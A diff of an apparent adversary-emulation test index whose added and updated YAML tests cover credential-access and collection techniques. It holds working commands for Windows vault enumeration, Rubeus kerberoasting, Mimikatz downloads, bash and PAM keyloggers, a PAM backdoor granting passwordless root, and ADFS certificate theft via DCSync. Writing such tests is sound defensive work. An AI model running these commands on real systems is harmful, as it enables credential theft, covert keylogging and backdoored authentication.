@@ -264,7 +264,7 @@ credential-access:
           default: rubeus_output.txt
         rubeus_url:
           description: URL of Rubeus executable
-          type: url
+          type: Url
           default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
       dependency_executor_name: powershell
       dependencies:
@@ -1212,6 +1212,32 @@ credential-access:
           -UseBasicParsing); Get-CredManCreds -Force
 
 '
+    - name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe
+        [Windows Credentials]
+      auto_generated_guid: 36753ded-e5c4-4eb5-bc3c-e8fba236878d
+      description: This module will enumerate credentials stored in Windows Credentials
+        vault of Windows Credential Manager using builtin utility vaultcmd.exe
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'vaultcmd /listcreds:"Windows Credentials" /all
+
+'
+    - name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe
+        [Web Credentials]
+      auto_generated_guid: bc071188-459f-44d5-901a-f8f2625b2d2e
+      description: This module will enumerate credentials stored in Web Credentials
+        vault of Windows Credential Manager using builtin utility vaultcmd.exe
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'vaultcmd /listcreds:"Web Credentials" /all
+
+'
   T1555.003:
     technique:
       created: '2020-02-12T18:57:36.041Z'
@@ -1351,7 +1377,7 @@ credential-access:
       input_arguments:
         search_string:
           description: String to search Safari cookies to find.
-          type: string
+          type: String
           default: coinbase
       executor:
         command: |
@@ -1563,15 +1589,15 @@ credential-access:
       input_arguments:
         domain:
           description: Targeted Active Directory domain
-          type: string
+          type: String
           default: example.com
         user:
           description: Targeted user
-          type: string
+          type: String
           default: krbtgt
         mimikatz_path:
           description: Mimikatz windows executable
-          type: path
+          type: Path
           default: "%tmp%\\mimikatz\\x64\\mimikatz.exe"
       dependency_executor_name: powershell
       dependencies:
@@ -1584,7 +1610,8 @@ credential-access:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -2042,23 +2069,23 @@ credential-access:
         domain_sid:
           description: SID of the targeted domain, if you keep default it will automatically
             get the current domain SID
-          type: string
+          type: String
           default: S-1-5-21-DEFAULT
         domain:
           description: Targeted Active Directory domain FQDN
-          type: string
+          type: String
           default: example.com
         account:
           description: Account to impersonate
-          type: string
+          type: String
           default: goldenticketfakeuser
         krbtgt_aes256_key:
           description: Krbtgt AES256 key
-          type: string
+          type: String
           default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
         mimikatz_path:
           description: Mimikatz windows executable
-          type: path
+          type: Path
           default: "$env:TEMP\\mimikatz\\x64\\mimikatz.exe"
       dependency_executor_name: powershell
       dependencies:
@@ -2071,7 +2098,8 @@ credential-access:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -2103,7 +2131,7 @@ credential-access:
           'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy
           loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content
           $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat
-          -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore"
+          -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n"
   T1552.006:
     technique:
       external_references:
@@ -2204,7 +2232,7 @@ credential-access:
       input_arguments:
         gpp_script_url:
           description: URL of the Get-GPPPassword PowerShell Script
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1
         gpp_script_path:
           description: Path to the Get-GPPPassword PowerShell Script
@@ -2420,6 +2448,68 @@ credential-access:
           iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
           Invoke-Kerberoast | fl
         name: powershell
+    - name: Rubeus kerberoast
+      auto_generated_guid: 14625569-6def-4497-99ac-8e7817105b55
+      description: |
+        Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
+        This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus
+      supported_platforms:
+      - windows
+      input_arguments:
+        local_folder:
+          description: Local path of Rubeus executable
+          type: Path
+          default: "$Env:temp"
+        local_executable:
+          description: name of the rubeus executable
+          type: String
+          default: rubeus.exe
+        out_file:
+          description: file where command results are stored
+          type: String
+          default: rubeus_output.txt
+        rubeus_url:
+          description: URL of Rubeus executable
+          type: Url
+          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+        flags:
+          description: command flags you would like to run (optional and blank by
+            default)
+          type: String
+          default: 
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
+      - description: 'Rubeus must exist
+
+'
+        prereq_command: 'if(Test-Path -Path #{local_folder}\#{local_executable}) {exit
+          0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
+
+'
+      executor:
+        command: 'cmd.exe /c "#{local_folder}\#{local_executable}" kerberoast #{flags}
+          /outfile:"#{local_folder}\#{out_file}"
+
+'
+        cleanup_command: 'Remove-Item #{local_folder}\#{out_file} -ErrorAction Ignore
+
+'
+        name: powershell
+        elevation_required: false
   T1555.001:
     technique:
       created: '2020-02-12T18:55:24.728Z'
@@ -2483,7 +2573,7 @@ credential-access:
       input_arguments:
         cert_export:
           description: Specify the path of the certificates to export.
-          type: path
+          type: Path
           default: "/tmp/certs.pem"
       executor:
         command: |
@@ -2624,6 +2714,143 @@ credential-access:
           sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
         name: sh
         elevation_required: true
+    - name: Logging bash history to syslog
+      auto_generated_guid: 0e59d59d-3265-4d35-bebd-bf5c1ec40db5
+      description: "There are several variables that can be set to control the appearance
+        of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents
+        of these variables are executed as if they had been typed on the command line.
+        The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable
+        and can be configured to write the latest \"bash history\" entries to the
+        syslog.\n\nTo gain persistence the command could be added to the users .bashrc
+        or .bash_aliases or the systems default .bashrc in /etc/skel/ \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires to be run in a bash shell and that logger
+          and tee are installed.
+
+'
+        prereq_command: |
+          if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n***** Bash not running! *****\n"; exit 1; fi
+          if [ ! -x "$(command -v logger)" ]; then echo -e "\n***** logger NOT installed *****\n"; exit 1; fi
+          if [ ! -x "$(command -v tee)" ]; then echo -e "\n***** tee NOT installed *****\n"; exit 1; fi
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
+          echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
+          tail /var/log/syslog
+        cleanup_command: 'unset PROMPT_COMMAND
+
+'
+    - name: Bash session based keylogger
+      auto_generated_guid: 7f85a946-a0ea-48aa-b6ac-8ff539278258
+      description: "When a command is executed in bash, the BASH_COMMAND variable
+        contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\".
+        The trap command is not a external command, but a built-in function of bash
+        and can be used in a script to run a bash function when some event occurs.
+        trap will detect when the BASH_COMMAND variable value changes and then pipe
+        that value into a file, creating a bash session based keylogger. \n\nTo gain
+        persistence the command could be added to the users .bashrc or .bash_aliases
+        or the systems default .bashrc in /etc/skel/ \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires to be run in a bash shell
+
+'
+        prereq_command: 'if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n*****
+          Bash not running! *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      input_arguments:
+        output_file:
+          name: output_file
+          description: File to store captured commands
+          type: String
+          default: "/tmp/.keyboard.log"
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> #{output_file}' DEBUG
+          echo "Hello World!"
+          cat #{output_file}
+        cleanup_command: 'rm #{output_file}
+
+'
+    - name: SSHD PAM keylogger
+      auto_generated_guid: 81d7d2ad-d644-4b6a-bea7-28ffe43becca
+      description: 'Linux PAM (Pluggable Authentication Modules) is used in sshd authentication.
+        The Linux audit tool auditd can use the pam_tty_audit module to enable auditing
+        of TTY input and capture all keystrokes in a ssh session and place them in
+        the /var/log/audit/audit.log file after the session closes.
+
+'
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires sshd and auditd
+
+'
+        prereq_command: |
+          if [ ! -x "$(command -v sshd)" ]; then echo -e "\n***** sshd NOT installed *****\n"; exit 1; fi
+          if [ ! -x "$(command -v auditd)" ]; then echo -e "\n***** auditd NOT installed *****\n"; exit 1; fi
+        get_prereq_command: 'echo ""
+
+'
+      input_arguments:
+        user_account:
+          description: Basic ssh user account for testing.
+          type: String
+          default: ubuntu
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: "cp -v /etc/pam.d/sshd /tmp/\necho >> \"session required pam_tty_audit.so
+          disable=* enable=* open_only log_passwd\"\nsystemctl restart sshd\nsystemctl
+          restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n"
+        cleanup_command: 'cp -fv /tmp/sshd /etc/pam.d/
+
+'
+    - name: Auditd keylogger
+      auto_generated_guid: a668edb9-334e-48eb-8c2e-5413a40867af
+      description: "The linux audit tool auditd can be used to capture 32 and 64 bit
+        command execution and place the command in the /var/log/audit/audit.log audit
+        log. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires sshd and auditd
+
+'
+        prereq_command: 'if [ ! -x "$(command -v auditd)" ]; then echo -e "\n*****
+          auditd NOT installed *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl
+          -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start
+          $(date +\"%d/%m/%y %H:%M:%S\") \n"
+        cleanup_command: 'systemctl restart auditd
+
+'
   T1557.001:
     technique:
       external_references:
@@ -2921,7 +3148,7 @@ credential-access:
           default: PathToAtomicsFolder\T1003.001\bin\wce.exe
         wce_url:
           description: Path to download Windows Credential Editor zip file
-          type: url
+          type: Url
           default: https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
       dependency_executor_name: powershell
       dependencies:
@@ -3075,7 +3302,7 @@ credential-access:
           default: "%tmp%\\lsass.DMP"
         mimikatz_exe:
           description: Path of the Mimikatz binary
-          type: string
+          type: String
           default: PathToAtomicsFolder\T1003.001\bin\mimikatz.exe
       dependency_executor_name: powershell
       dependencies:
@@ -3087,15 +3314,8 @@ credential-access:
 '
         get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          $url = 'https://github.com/gentilkiwi/mimikatz/releases/latest'
-          $request = [System.Net.WebRequest]::Create($url)
-          $response = $request.GetResponse()
-          $realTagUrl = $response.ResponseUri.OriginalString
-          $version = $realTagUrl.split('/')[-1]
-          $fileName = 'mimikatz_trunk.zip'
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          $realDownloadUrl =$realTagUrl.Replace('tag','download') + '/' + $fileName
-          Invoke-WebRequest $realDownloadUrl -OutFile "$env:TEMP\Mimi.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\Mimi.zip"
           Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
@@ -3890,19 +4110,19 @@ credential-access:
           default: Ethernet
         wireshark_url:
           description: wireshark installer download URL
-          type: url
+          type: Url
           default: https://1.eu.dl.wireshark.org/win64/Wireshark-win64-3.4.5.exe
         tshark_path:
           description: path to tshark.exe
-          type: path
+          type: Path
           default: c:\program files\wireshark\tshark.exe
         npcap_url:
           description: npcap installed download URL
-          type: url
+          type: Url
           default: https://nmap.org/npcap/dist/npcap-1.31.exe
         npcap_path:
           description: path to npcap.sys
-          type: path
+          type: Path
           default: C:\Program Files\Npcap\npcap.sys
       dependency_executor_name: powershell
       dependencies:
@@ -4085,7 +4305,7 @@ credential-access:
           default: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC
         gsecdump_url:
           description: Path to download Gsecdump binary file
-          type: url
+          type: Url
           default: https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe
       dependency_executor_name: powershell
       dependencies:
@@ -4230,11 +4450,11 @@ credential-access:
           default: "%temp%\\hashcat6\\hashcat-6.1.1\\hashcat.exe"
         input_file_sam:
           description: Path to SAM file
-          type: string
+          type: String
           default: PathToAtomicsFolder\T1110.002\src\sam.txt
         input_file_passwords:
           description: Path to password list
-          type: string
+          type: String
           default: PathToAtomicsFolder\T1110.002\src\password.lst
       dependency_executor_name: powershell
       dependencies:
@@ -4497,7 +4717,7 @@ credential-access:
           default: contoso.com
         auth:
           description: authentication method to choose between "NTLM" and "Kerberos"
-          type: string
+          type: String
           default: NTLM
       executor:
         name: powershell
@@ -4733,7 +4953,7 @@ credential-access:
       input_arguments:
         password:
           description: The password to try for each user in users.txt
-          type: string
+          type: String
           default: Spring2020
       dependencies:
       - description: 'List of domain users to password spray must exits at %temp%\users.txt
@@ -4793,7 +5013,7 @@ credential-access:
           default: contoso.com
         auth:
           description: authentication method to choose between "NTLM" and "Kerberos"
-          type: string
+          type: String
           default: NTLM
       executor:
         name: powershell
@@ -4845,7 +5065,7 @@ credential-access:
           default: bruce.wayne@contoso.com
         valid_password:
           description: Valid password to authenticate as valid_username in the <valid_ms_account>
-          type: string
+          type: String
           default: iamthebatman
       dependency_executor_name: powershell
       dependencies:
@@ -4949,7 +5169,100 @@ credential-access:
       x_mitre_platforms:
       - Linux
       - macOS
-    atomic_tests: []
+      identifier: T1556.003
+    atomic_tests:
+    - name: Malicious PAM rule
+      auto_generated_guid: 4b9dde80-ae22-44b1-a82a-644bf009eb9c
+      description: |
+        Inserts a rule into a PAM config and then tests it.
+
+        Upon successful execution, this test will insert a rule that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: String
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: String
+          default: auth sufficient pam_succeed_if.so uid >= 0
+        index:
+          description: Index where the rule is inserted.
+          type: Integer
+          default: 1
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
+    - name: Malicious PAM module
+      auto_generated_guid: 65208808-3125-4a2e-8389-a0a00e9ab326
+      description: |
+        Creates a PAM module, inserts a rule to use it, and then tests it.
+
+        Upon successful execution, this test will create a PAM module that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: String
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: String
+          default: auth sufficient /tmp/pam_evil.so
+        index:
+          description: Index where the rule is inserted.
+          type: Integer
+          default: 1
+        path_to_pam_module_source:
+          description: Path to PAM module source code.
+          type: Path
+          default: PathToAtomicsFolder/T1556.003/src/pam_evil.c
+        path_to_pam_module:
+          description: Path to PAM module object
+          type: Path
+          default: "/tmp/pam_evil.so"
+      dependencies:
+      - description: 'The PAM development library must be installed to build the PAM
+          module
+
+'
+        prereq_command: 'if [ -f /usr/include/security/pam_modules.h ]; then exit
+          0; else exit 1; fi;
+
+'
+        get_prereq_command: 'if [ -n "`which apt-get`" ]; then sudo apt-get -y install
+          libpam0g-dev; elif [ -n "`which yum`" ]; then sudo yum -y install pam-devel;
+          fi
+
+'
+      - description: 'The PAM module must exist on disk at specified location (#{path_to_pam_module})
+
+'
+        prereq_command: 'if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1;
+          fi;
+
+'
+        get_prereq_command: 'sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source}
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
   T1552.004:
     technique:
       id: attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf
@@ -5038,11 +5351,11 @@ credential-access:
       input_arguments:
         search_path:
           description: Path where to start searching from.
-          type: path
+          type: Path
           default: "/"
         output_file:
           description: Output file containing locations of SSH key files
-          type: path
+          type: Path
           default: "/tmp/keyfile_locations.txt"
       executor:
         command: 'find #{search_path} -name id_rsa >> #{output_file}
@@ -5063,11 +5376,11 @@ credential-access:
       input_arguments:
         search_path:
           description: Path where to start searching from.
-          type: path
+          type: Path
           default: "/"
         output_folder:
           description: Output folder containing copies of SSH private key files
-          type: path
+          type: Path
           default: "/tmp/art-staging"
       executor:
         command: |
@@ -5089,11 +5402,11 @@ credential-access:
       input_arguments:
         search_path:
           description: Path where to start searching from.
-          type: path
+          type: Path
           default: "/"
         output_folder:
           description: Output folder containing copies of SSH private key files
-          type: path
+          type: Path
           default: "/tmp/art-staging"
       executor:
         command: |
@@ -5115,11 +5428,11 @@ credential-access:
       input_arguments:
         search_path:
           description: Path where to start searching from
-          type: path
+          type: Path
           default: "/"
         output_folder:
           description: Output folder containing a copy of the .gnupg directory
-          type: path
+          type: Path
           default: "/tmp/GnuPG"
       executor:
         command: |
@@ -5129,6 +5442,99 @@ credential-access:
 
 '
         name: sh
+    - name: ADFS token signing and encryption certificates theft - Local
+      auto_generated_guid: 78e95057-d429-4e66-8f82-0f060c1ac96f
+      description: |
+        Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.
+        Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AADInternals module must be installed.
+
+'
+        prereq_command: 'if (Get-Module AADInternals) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AADInternals -Force
+
+'
+      executor:
+        command: |
+          Import-Module AADInternals -Force
+          Export-AADIntADFSCertificates
+          Get-ChildItem | Where-Object {$_ -like "ADFS*"}
+          Write-Host "`nCertificates retrieved successfully"
+        cleanup_command: |
+          Remove-Item -Path ".\ADFS_encryption.pfx"
+          Remove-Item -Path ".\ADFS_signing.pfx"
+        name: powershell
+    - name: ADFS token signing and encryption certificates theft - Remote
+      auto_generated_guid: cab413d8-9e4a-4b8d-9b84-c985bd73a442
+      description: |
+        Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.
+        Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
+      supported_platforms:
+      - windows
+      input_arguments:
+        adfs_service_account_name:
+          description: Name of the ADFS service account
+          type: String
+          default: adfs_svc
+        replication_user:
+          description: Username with replication rights. It can be the Domain Admin
+            running the script
+          type: String
+          default: Administrator
+        replication_password:
+          description: Password of replication_username
+          type: String
+          default: ReallyStrongPassword
+        adfs_server_name:
+          description: Name of an ADFS server
+          type: String
+          default: sts.contoso.com
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AADInternals and ActiveDirectory modules must be installed.
+
+'
+        prereq_command: 'if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable
+          -Name ActiveDirectory)) {echo 0} else {echo 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AADInternals -Force
+
+'
+      executor:
+        command: "Import-Module ActiveDirectory -Force \nImport-Module AADInternals
+          -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc
+          = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object
+          name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString
+          -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object
+          -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user},
+          $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash
+          = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential
+          -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration
+          -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get
+          certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group =
+          $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container
+          = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent
+          = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base
+          = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter
+          = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\")
+          | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"]
+          \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\")
+          | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne()
+          \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted
+          certificates from configuration and decrypt them\nExport-AADIntADFSCertificates
+          -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like
+          \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n"
+        cleanup_command: |
+          Remove-Item -Path ".\ADFS_encryption.pfx"
+          Remove-Item -Path ".\ADFS_signing.pfx"
+        name: powershell
   T1003.007:
     technique:
       external_references:
@@ -6728,7 +7134,7 @@ collection:
           default: "%ProgramFiles%\\WinZip\\winzip64.exe"
         winzip_url:
           description: Path to download Windows Credential Editor zip file
-          type: url
+          type: Url
           default: https://download.winzip.com/gl/nkln/winzip24-home.exe
         winzip_hash:
           description: File hash of the Windows Credential Editor zip file
@@ -6920,7 +7326,7 @@ collection:
           default: T1560
         encryption_password:
           description: Password used to encrypt data.
-          type: string
+          type: String
           default: InsertPasswordHere
       dependency_executor_name: sh
       dependencies:
@@ -8175,6 +8581,143 @@ collection:
           sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
         name: sh
         elevation_required: true
+    - name: Logging bash history to syslog
+      auto_generated_guid: 0e59d59d-3265-4d35-bebd-bf5c1ec40db5
+      description: "There are several variables that can be set to control the appearance
+        of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents
+        of these variables are executed as if they had been typed on the command line.
+        The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable
+        and can be configured to write the latest \"bash history\" entries to the
+        syslog.\n\nTo gain persistence the command could be added to the users .bashrc
+        or .bash_aliases or the systems default .bashrc in /etc/skel/ \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires to be run in a bash shell and that logger
+          and tee are installed.
+
+'
+        prereq_command: |
+          if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n***** Bash not running! *****\n"; exit 1; fi
+          if [ ! -x "$(command -v logger)" ]; then echo -e "\n***** logger NOT installed *****\n"; exit 1; fi
+          if [ ! -x "$(command -v tee)" ]; then echo -e "\n***** tee NOT installed *****\n"; exit 1; fi
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
+          echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
+          tail /var/log/syslog
+        cleanup_command: 'unset PROMPT_COMMAND
+
+'
+    - name: Bash session based keylogger
+      auto_generated_guid: 7f85a946-a0ea-48aa-b6ac-8ff539278258
+      description: "When a command is executed in bash, the BASH_COMMAND variable
+        contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\".
+        The trap command is not a external command, but a built-in function of bash
+        and can be used in a script to run a bash function when some event occurs.
+        trap will detect when the BASH_COMMAND variable value changes and then pipe
+        that value into a file, creating a bash session based keylogger. \n\nTo gain
+        persistence the command could be added to the users .bashrc or .bash_aliases
+        or the systems default .bashrc in /etc/skel/ \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires to be run in a bash shell
+
+'
+        prereq_command: 'if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n*****
+          Bash not running! *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      input_arguments:
+        output_file:
+          name: output_file
+          description: File to store captured commands
+          type: String
+          default: "/tmp/.keyboard.log"
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> #{output_file}' DEBUG
+          echo "Hello World!"
+          cat #{output_file}
+        cleanup_command: 'rm #{output_file}
+
+'
+    - name: SSHD PAM keylogger
+      auto_generated_guid: 81d7d2ad-d644-4b6a-bea7-28ffe43becca
+      description: 'Linux PAM (Pluggable Authentication Modules) is used in sshd authentication.
+        The Linux audit tool auditd can use the pam_tty_audit module to enable auditing
+        of TTY input and capture all keystrokes in a ssh session and place them in
+        the /var/log/audit/audit.log file after the session closes.
+
+'
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires sshd and auditd
+
+'
+        prereq_command: |
+          if [ ! -x "$(command -v sshd)" ]; then echo -e "\n***** sshd NOT installed *****\n"; exit 1; fi
+          if [ ! -x "$(command -v auditd)" ]; then echo -e "\n***** auditd NOT installed *****\n"; exit 1; fi
+        get_prereq_command: 'echo ""
+
+'
+      input_arguments:
+        user_account:
+          description: Basic ssh user account for testing.
+          type: String
+          default: ubuntu
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: "cp -v /etc/pam.d/sshd /tmp/\necho >> \"session required pam_tty_audit.so
+          disable=* enable=* open_only log_passwd\"\nsystemctl restart sshd\nsystemctl
+          restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n"
+        cleanup_command: 'cp -fv /tmp/sshd /etc/pam.d/
+
+'
